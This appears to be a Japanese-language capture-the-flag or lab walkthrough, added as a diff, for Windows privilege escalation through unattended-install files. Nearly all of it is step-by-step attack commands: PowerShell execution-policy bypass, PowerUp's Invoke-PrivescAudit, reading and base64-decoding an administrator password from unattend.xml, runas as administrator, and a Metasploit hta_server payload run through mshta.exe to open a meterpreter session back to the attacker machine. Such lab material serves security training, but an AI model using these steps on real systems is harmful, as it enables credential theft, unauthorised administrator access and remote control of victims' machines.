@@ -1,0 +1,32 @@
+無人インストール
+1) 攻撃者マシンとターゲットマシンを開いた状態にする
+2) windows powershellを開く。
+3) whoamiで現在のユーザーを確認する
+4) cd .\Desktop\PowerSploit\Privesc\に移動して、lsでディレクトリを確認する
+5) powerup.ps1スクリプトとinvoke-privescaudit関数をインポートする
+poershell -ep bypass
+. .\PoerUp.ps1
+Invoke-PrivescAudit
+6) システムにunattend.xmlファイルがある場合、そのファイルを開いて、catコマンドで読み取る
+＊unattend.xmlは、インストール用の応答ファイルで、このファイルには、エンコードされたまたはプレーンテキスト形式の資格情報やその他の機密情報が含まれる
+7) 6)で見つけたパスコードを使って、管理者パスワードをデコードする
+$password='パスコード'
+$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
+echo $password
+8) 7)で検出したパスワードを使って、管理者ユーザーとしてコマンドプロンプトを実行する
+runas.exe /user:administrator cmd
+パスコード
+whomai
+9) kaliに切り替えて、msfconsoleを起動する
+msfconsole -q
+use exploit/windows/misc/hta_server
+exploit
+10) 9)で生成されたペイロードをコピーして、meterpreterを取得する
+mshta.exe コピーしたペイロード
+11) フラグを見つける
+sessions -i 1
+cd /
+cd C:\\Users\\Administrator\\Desktop
+dir 
+cat flag.txt
+
